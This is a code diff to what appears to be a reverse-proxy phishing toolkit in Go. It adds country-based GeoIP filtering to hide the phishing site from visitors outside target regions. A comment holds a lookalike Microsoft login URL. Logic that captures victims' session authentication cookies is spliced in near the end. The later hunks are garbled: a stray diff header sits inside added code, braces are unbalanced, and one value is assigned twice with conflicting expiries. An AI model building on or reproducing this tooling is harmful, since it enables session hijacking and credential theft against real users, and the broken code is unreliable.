@@ -64,6 +64,8 @@ type HttpProxy struct {
 	cfg               *Config
 	db                *database.Database
 	bl                *Blacklist
+	wl                *Whitelist
+	geoip_db          *Reader
 	sniListener       net.Listener
 	isRunning         bool
 	isAdded           bool
@@ -100,7 +102,7 @@ func goDotEnvVariable(key string) string {
 	return os.Getenv(key)
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, wl *Whitelist, geoip_db *Reader, developer bool) (*HttpProxy, error) {
 	//log.Warning("NEW HTTP PROXY")
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -109,6 +111,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		cfg:               cfg,
 		db:                db,
 		bl:                bl,
+		wl:                wl,
+		geoip_db:          geoip_db,
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -185,6 +189,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			from_ip := req.RemoteAddr
 			if strings.Contains(from_ip, ":") {
 				from_ip = strings.Split(from_ip, ":")[0]
+			}
+			
+			if !p.wl.IsIPFromWhitelistedCountry(from_ip, geoip_db) {
+				log.Warning("country whitelist: request from ip address '%s' was blocked", from_ip)
+				return p.blockRequest(req)
 			}
 			
 			if p.cfg.GetBlacklistMode() == "all" {
@@ -501,15 +510,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.ContentLength = int64(len(body))
 
 						log.Debug("POST: %s", req.URL.Path)
-						//var objmap []map[string]interface{}
-						//if err := json.Unmarshal(body, &objmap); err != nil {
-						//	log.Fatal("err")
-						//	//return
-						//}
-
+	
 						log.Debug("POST body = %s", body)
-						//log.Warning("POST body = %s", objmap)
-						//json.Unmarshal()
 
 						contentType := req.Header.Get("Content-type")
 						if contentType == "application/json" {
@@ -1120,6 +1122,23 @@ func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 }
 
 //https://microsoftonline.verify-status.online/login/aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tL1NpWG5jbEFUP3ZlcmlmeT14eFdD
+
+func (p *HttpProxy) whitelistIP(ip_addr string, sid string) {
+	log.Debug("whitelistIP: %s %s", ip_addr, sid)
+	p.ip_whitelist[ip_addr] = time.Now().Add(5 * time.Minute).Unix()
+	p.ip_whitelist[ip_addr] = time.Now().Add(5 * time.Second).Unix()
+	p.ip_sids[ip_addr] = sid
+}
+
+@@ -865,7 +865,6 @@ func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
+	ct := time.Now()
+	if pl.isAuthToken(c_domain, ck.Name) {
+						s, ok := p.sessions[ps.SessionId]
+						if ok && (s.IsAuthUrl || !s.IsDone) {
+							if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
+								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
+								if len(pl.authUrls) > 0 {
+									is_auth = false
 
 func (p *HttpProxy) isForwarderUrlBy2(req *http.Request) bool {
 
